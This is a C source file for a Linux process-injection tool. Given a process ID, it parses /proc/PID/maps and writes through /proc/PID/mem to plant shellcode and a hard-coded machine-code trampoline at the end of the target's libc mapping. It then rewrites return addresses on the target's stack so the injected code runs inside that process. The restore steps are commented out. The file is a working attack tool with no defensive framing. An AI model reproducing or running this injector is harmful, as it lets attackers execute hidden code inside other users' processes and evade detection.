#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "shellcode.h"
#include "mem_inject.h"

#define DEBUG 1
#define DELAY 8


int maps_parser(unsigned int pid, maps_t **mfile, size_t *mapcount) {
    unsigned char filepath[100];

    sprintf(filepath, "/proc/%d/maps\x00", pid);
    #if DEBUG
    printf("current path is %s\n", filepath);
    #endif

    FILE *f = fopen(filepath, "rb");
    if (!f) {
        #if DEBUG
        printf("[!] file not found\n");
        #endif
        return -1;
    }

    unsigned int flag = 1;
    size_t total = 0;
    *mapcount = 0;

    while (1) {
        unsigned char c = fgetc(f);
        total += 1;
        if (c == '\n') {
            *mapcount += 1;
        }
        if (feof(f)) {
            break;
        }
    }

    unsigned char *filebuff = malloc(total);
    *mfile = malloc(*mapcount * sizeof(maps_t));

    printf("count is %d\n", *mapcount);

    fseek(f, 0, SEEK_SET);

    for (size_t i = 0; i < total - 1; i++) {
        filebuff[i] = fgetc(f);
        if (feof(f)) {
            break;
        }
    }

    int file_to_maps(maps_t *mapsfile, unsigned char *filebuff) {
        size_t k = 0;
        size_t count = 0;
        unsigned int stage = 0;
        for (size_t i = 0; i < total - 1; i++) {
            if (filebuff[i] == '-' && stage == 0) {
                mapsfile[count].str_start[k] = '\x0';
                mapsfile[count].addr_start = strtoul(mapsfile[count].str_start, NULL, 16);
                k = 0;
                stage = 1;
            } else if (filebuff[i] == ' ' && stage != 6) {
                if (stage == 1) {
                    mapsfile[count].str_finish[k] = '\x0';
                    mapsfile[count].addr_finish = strtoul(mapsfile[count].str_finish, NULL, 16);
                } else if (stage == 2) {
                    mapsfile[count].perms[k] = '\x0';
                } else if (stage == 3) {
                    mapsfile[count].offset[k] = '\x0';
                } else if (stage == 4) {
                    mapsfile[count].dev[k] = '\x0';
               } else if (stage == 5) {
                    mapsfile[count].inode[k] = '\x0';
                }
                k = 0;
                stage += 1;
            } else if (filebuff[i] == '\n') {
                mapsfile[count].pathname[k] = '\x0';
                k = 0;
                stage = 0;
                count += 1;
            } else if (stage == 0) {
                mapsfile[count].str_start[k] = filebuff[i];
                k += 1;
            } else if (stage == 1) {
                mapsfile[count].str_finish[k] = filebuff[i];
                k += 1;
            } else if (stage == 2) {
                mapsfile[count].perms[k] = filebuff[i];
                k += 1;
            } else if (stage == 3) {
                mapsfile[count].offset[k] = filebuff[i];
                k += 1;
            } else if (stage == 4) {
                mapsfile[count].dev[k] = filebuff[i];
                k += 1;
            } else if (stage == 5) {
                mapsfile[count].inode[k] = filebuff[i];
                k += 1;
            } else if (stage == 6) {
                if (filebuff[i] != ' ') {
                    mapsfile[count].pathname[k] = filebuff[i];
                    k += 1;
                }
            }
        }
        return 0;
    }

    file_to_maps(*mfile, filebuff);
    free(filebuff);
    return 0;
}

int machinecode_from_char(unsigned char *code, size_t count) {
    #if __linux__
    printf("\033[01;30mmachine code:\033[00m ");
    #else
    printf("machine code: ");
    #endif
    for (size_t i = 0; i < count; i++) {
        printf("%02hhx ", code[i]);
    }
    printf("\n");
}

int get_num_from_maps_by_name(unsigned char *mapsname, size_t mapsize, int n, unsigned char *name, size_t size, int *num) {
    int matched = 0;
    for (size_t i = 0; i < mapsize; i++) {
        matched = 0;
        for (size_t j = 0; j < size - 1; j++) {
            if (mapsname[i+j] == name[j]) {
                matched += 1;
            }
        }
        if ( matched == (size - 1) ) {
            *num = n;
            return 0;
            break;
        }
    }
    return -1;
}

int search_addr_in_mem(unsigned char *memory, size_t memsize, maps_t *mapsfile, int *exec_nums, size_t exec_size, size_t offset, link_t **memtable, size_t *memtable_count) {
    unsigned int a;
    unsigned int b;
    unsigned long addr;

    // check before
    unsigned long clear_count = 0;
    a = memory[0+sizeof(unsigned long)] | (memory[1+sizeof(unsigned long)] << 8) | (memory[2+sizeof(unsigned long)] << 16) | (memory[3+sizeof(unsigned long)] << 24);
    b = memory[4+sizeof(unsigned long)] | (memory[5+sizeof(unsigned long)] << 8) | (memory[6+sizeof(unsigned long)] << 16) | (memory[7+sizeof(unsigned long)] << 24);
    clear_count = (unsigned long)b << 32 | a & 0xFFFFFFFFL;
    printf("cleared_count is %d\n", clear_count);

    // init as zeros
    if (clear_count > 0) {
        size_t bytecount = (clear_count + 1) * 2 * sizeof(unsigned long);
        for (size_t i = 0; i < bytecount; i++) {
            memory[i] = 0;
        }
    }

    size_t addr_in_mem(link_t *pointer_to_addr) {
        size_t acc = 0;
        for (size_t n = 0; n < exec_size; n++) {
            for (size_t i = 0; i < memsize - sizeof(addr); i++) {
                a = memory[i] | (memory[i+1] << 8) | (memory[i+2] << 16) | (memory[i+3] << 24);
                b = memory[i+4] | (memory[i+5] << 8) | (memory[i+6] << 16) | (memory[i+7] << 24);
                addr = (unsigned long)b << 32 | a & 0xFFFFFFFFL;
                if (mapsfile[exec_nums[n]].addr_start < addr && addr < mapsfile[exec_nums[n]].addr_finish) {
                    if (pointer_to_addr != NULL) {
                        pointer_to_addr[acc].pointer = i + offset;
                        pointer_to_addr[acc].value = addr;
                    }
                    acc += 1;
                }
            }
        }
        return acc;
    }
    *memtable_count = addr_in_mem(NULL);
    *memtable = malloc(*memtable_count * sizeof(link_t));
    addr_in_mem(*memtable);
    return 0;
}

int restore_addr_in_mem(FILE *f, link_t *memtable, size_t memtable_count) {
    for (size_t i = 0; i < memtable_count; i++) {
        fseek(f, memtable[i].pointer, SEEK_SET);
        size_t count = fwrite(&memtable[i].value, 1, sizeof(unsigned long), f);
        printf("[Restored] 0x%lx -> 0x%lx\n", memtable[i].pointer, memtable[i].value);
    }
    return 0;
}

int spoof_addr_in_mem(FILE *f, link_t *memtable, size_t memtable_count, unsigned long stackoffset, unsigned long offset) {
    unsigned long shift = 0;
    size_t count = 0;
    for (size_t i = 0; i < memtable_count; i++) {
        fseek(f, stackoffset, SEEK_SET);
        count = fwrite(&memtable[i].pointer, 1, sizeof(unsigned long), f);
        stackoffset += sizeof(unsigned long);
        fseek(f, stackoffset, SEEK_SET);
        count = fwrite(&memtable[i].value, 1, sizeof(unsigned long), f);
        stackoffset += sizeof(unsigned long);
        fseek(f, memtable[i].pointer, SEEK_SET);
        count = fwrite(&offset, 1, sizeof(unsigned long), f);
        printf("[Spoofed] 0x%lx -> 0x%lx to 0x%lx\n", memtable[i].pointer, memtable[i].value, offset);
    }
    return 0;
}

int exec_code(unsigned int pid, maps_t *mapsfile, size_t mapcount, unsigned char *ret_code, size_t ret_size, unsigned const char *code, size_t code_size) {
    unsigned char filepath[100];
    sprintf(filepath, "/proc/%d/mem\x00", pid);

    FILE *f2 = fopen(filepath, "r+b");
    if (!f2) {
        #if DEBUG
        printf("[!] file not found\n");
        #endif
        return -1;
    }

    size_t count;
    size_t matched;
    unsigned char libcname[] = "libc";
    unsigned char stackname[] = "[stack]";
    unsigned char perms[] = "x";

    size_t exec_size = 0;
    int *exec_nums = malloc(mapcount * sizeof(int));
    int libc_num = -1;
    int stack_num = -1;

    for (int n = 0; n < mapcount; n++) {
        if (get_num_from_maps_by_name(mapsfile[n].perms, sizeof(mapsfile[n].perms), n, perms, sizeof(perms), &exec_nums[exec_size]) == 0) {
            exec_size += 1;
            get_num_from_maps_by_name(mapsfile[n].pathname, sizeof(mapsfile[n].pathname), n, libcname, sizeof(libcname), &libc_num);
        }
        get_num_from_maps_by_name(mapsfile[n].pathname, sizeof(mapsfile[n].pathname), n, stackname, sizeof(stackname), &stack_num);
    }
    exec_nums[exec_size] = -1;
    printf("libc %d\n", libc_num);
    printf("libc 0x%lx-0x%lx\n", mapsfile[libc_num].addr_start, mapsfile[libc_num].addr_finish);
    printf("stack %d\n", stack_num);
    printf("stack 0x%lx-0x%lx\n", mapsfile[stack_num].addr_start, mapsfile[stack_num].addr_finish);

    if (stack_num == -1) {
        #if DEBUG
        printf("stack num error\n");
        #endif
        return -1;
    }

    size_t stacksize = mapsfile[stack_num].addr_finish - mapsfile[stack_num].addr_start;
    unsigned char *buffer = malloc(sizeof(char) * stacksize);

    fseek(f2, mapsfile[stack_num].addr_start, SEEK_SET);
    count = fread(buffer, 1, stacksize, f2);
    #if DEBUG
    printf("stacksize is 0x%lx\n", count);
    #endif

    link_t *memtable;
    size_t memtable_count = 0;
    search_addr_in_mem(buffer, stacksize, mapsfile, exec_nums, exec_size, mapsfile[stack_num].addr_start, &memtable, &memtable_count);

    #if DEBUG
    printf("memcount is %d\n", memtable_count);
    #endif

    size_t backupsize = code_size + ret_size + sizeof(unsigned long int);
    unsigned long offset = mapsfile[libc_num].addr_finish - backupsize;
    unsigned long offset2 = offset + code_size;
    unsigned char *backup = malloc(sizeof(char) * backupsize);

    fseek(f2, offset, SEEK_SET);
    count = fread(backup, 1, backupsize, f2);
    #if DEBUG
    printf("backup count is %d\n", count);
    #endif

    // Spoofing libc
    fseek(f2, offset, SEEK_SET);
    count = fwrite(code, 1, code_size, f2);
    fseek(f2, offset2, SEEK_SET);
    count = fwrite(ret_code, 1, ret_size, f2);
    fseek(f2, offset2 + ret_size, SEEK_SET);
    count = fwrite(&mapsfile[stack_num].addr_start, 1, sizeof(unsigned long), f2);

    // Spoofing stack
    fseek(f2, mapsfile[stack_num].addr_start, SEEK_SET);
    count = fwrite(&offset, 1, sizeof(unsigned long), f2);
    fseek(f2, mapsfile[stack_num].addr_start + sizeof(unsigned long), SEEK_SET);
    count = fwrite(&memtable_count, 1, sizeof(unsigned long), f2);
    spoof_addr_in_mem(f2, memtable, memtable_count, mapsfile[stack_num].addr_start + 2*sizeof(unsigned long), offset2);

    // Restoring stack (partial)
    //sleep(DELAY);
    //fseek(f2, mapsfile[stack_num].addr_start, SEEK_SET);
    //size_t zeroes_size = 2 * (memtable_count + 1) * sizeof(unsigned long);
    //count = fwrite(buffer, 1, zeroes_size, f2);
    //#if DEBUG
    //printf("[Restored] stack (count %d)\n", count);
    //#endif

    // Restoring libc
    //fseek(f2, offset, SEEK_SET);
    //count = fwrite(backup, 1, backupsize, f2);
    //#if DEBUG
    //printf("[Restored] libc (count %d)\n", count);
    //#endif

    fclose(f2);
    free(buffer);
    free(backup);
    free(exec_nums);
    return 0;
}

int main(int argc, const char *argv[]) {
    if (argc <= 1) {
        #if DEBUG
        printf("usage: ./mem_inject 1337\n");
        #endif
        return -1;
    }
    unsigned int pid = atoi(argv[1]);
    if (pid == 0) {
        #if DEBUG
        printf("[!] pid is %d\n", pid);
        #endif
        return -1;
    }
    #if DEBUG
    printf("current pid is %d\n", pid);
    #endif

    unsigned char ret_code[] = {0xeb, 0x68, 0x50, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x48, 0x8b, 0x44, 0x24, 0x38, 0x48, 0x8b, 0x0, 0x48, 0x31, 0xc9, 0x48, 0x8b, 0x18, 0x48, 0x89, 0x8, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc6, 0x38, 0x48, 0x8b, 0x48, 0x8, 0x48, 0x83, 0xc0, 0x10, 0xeb, 0x8, 0x48, 0x89, 0x16, 0x48, 0x85, 0xdb, 0x74, 0x23, 0x48, 0xff, 0xc9, 0x48, 0x8b, 0x38, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x8b, 0x10, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x85, 0xdb, 0x74, 0x3, 0x48, 0x89, 0x17, 0x48, 0x31, 0xf7, 0x74, 0xda, 0x48, 0x85, 0xc9, 0x75, 0xdd, 0x48, 0x89, 0x5e, 0xf8, 0x48, 0x85, 0xdb, 0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58, 0x75, 0x4, 0x48, 0x83, 0xc4, 0x8, 0xc3, 0xe8, 0x93, 0xff, 0xff, 0xff};

    maps_t *mapsfile = NULL;
    size_t mapcount;
    maps_parser(pid, &mapsfile, &mapcount);
    exec_code(pid, mapsfile, mapcount, ret_code, sizeof(ret_code), shellcode, sizeof(shellcode));
    if (mapsfile != NULL) {
        free(mapsfile);
    }
    return -1;
}


// gcc mem_inject.c -o mem_inject
